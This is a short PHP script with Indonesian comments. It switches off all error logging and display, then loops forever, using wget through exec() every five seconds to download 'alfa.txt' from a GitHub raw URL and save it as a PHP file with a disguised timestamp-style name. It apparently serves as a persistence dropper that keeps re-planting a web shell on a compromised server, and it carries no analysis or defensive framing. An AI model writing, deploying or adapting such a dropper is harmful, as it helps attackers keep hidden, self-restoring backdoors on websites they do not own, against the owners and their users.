<?php

// Nonaktifkan logging error dan sembunyikan semua error
ini_set('log_errors', 'Off');       // Matikan logging ke file error_log
ini_set('display_errors', 'Off');  // Jangan tampilkan error di output
error_reporting(0);                // Nonaktifkan semua pelaporan error

// Loop tak terbatas
while (true) {
    // URL yang akan diunduh
    $url = 'https://raw.githubusercontent.com/kennn404/test/refs/heads/main/alfa.txt';
    
    // Menggunakan wget untuk mengambil konten
    $outputFile = '20220727061038_KGAA.php';
    $command = "wget -q -O $outputFile $url";

    // Menjalankan perintah wget
    exec($command, $output, $returnVar);

    // Memeriksa apakah perintah wget berhasil
    if ($returnVar !== 0) {
        // Jika terjadi kesalahan, lakukan logika internal (opsional)
        // Tidak ada output atau logging
    }

    // Menunggu selama 5 detik sebelum mengulangi
    sleep(5);
}
